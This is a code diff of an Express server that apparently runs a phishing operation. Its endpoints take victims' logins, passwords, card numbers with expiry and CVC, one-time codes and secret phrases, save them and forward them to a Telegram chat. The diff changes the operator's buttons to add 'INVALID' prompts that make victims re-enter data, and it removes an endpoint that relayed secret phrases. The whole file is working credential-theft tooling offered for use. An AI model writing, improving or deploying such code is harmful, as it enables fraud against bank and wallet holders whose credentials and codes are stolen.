@@ -155,10 +155,9 @@ app.post('/api/card', upload.none(), (req, res) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: 'Login', callback_data: `cred:${sessionId}` },
-                    { text: 'Card', callback_data: `card:${sessionId}` },
-                    { text: 'OTP', callback_data: `otp:${sessionId}` },
-                    { text: 'Secret', callback_data: `secret:${sessionId}` },
+                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
+                    { text: '❌ INVALID', callback_data: `cardinvalid:${sessionId}` },
+                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                 ],
             ],
         },
@@ -194,10 +193,9 @@ app.post('/api/otp', upload.none(), (req, res) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: 'Login', callback_data: `cred:${sessionId}` },
-                    { text: 'Card', callback_data: `card:${sessionId}` },
-                    { text: 'OTP', callback_data: `otp:${sessionId}` },
-                    { text: 'Secret', callback_data: `secret:${sessionId}` },
+                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
+                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
+                    { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
                 ],
             ],
         },
@@ -209,44 +207,6 @@ app.post('/api/otp', upload.none(), (req, res) => {
     res.status(200).json({ message: 'OTP received successfully' });
 });
 
-// Endpoint for handling secret phrase
-app.post('/api/secret', upload.none(), (req, res) => {
-    const { secretPhrase, sessionId } = req.body;
-
-    // Log the received data
-    console.log('Received secret phrase:');
-    console.log('Secret Phrase:', secretPhrase);
-    console.log('Session ID:', sessionId);
-
-    // Store user data
-    const users = readUserData();
-    if (!users[sessionId]) {
-        users[sessionId] = {};
-    }
-    users[sessionId].secretPhrase = secretPhrase;
-
-    // Write updated user data back to the JSON file
-    writeUserData(users);
-
-    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${users[sessionId].otp || ''}\n🔑 Secret: ${secretPhrase}\nSession ID: ${sessionId}`;
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: 'Login', callback_data: `cred:${sessionId}` },
-                    { text: 'Card', callback_data: `card:${sessionId}` },
-                    { text: 'OTP', callback_data: `otp:${sessionId}` },
-                    { text: 'Secret', callback_data: `secret:${sessionId}` },
-                ],
-            ],
-        },
-    };
-
-    bot.sendMessage(config.chatId, message, options);
-
-    // Send response to client
-    res.status(200).json({ message: 'Secret phrase received successfully' });
-});
 
 // Handle callback queries from Telegram
 bot.on('callback_query', (callbackQuery) => {
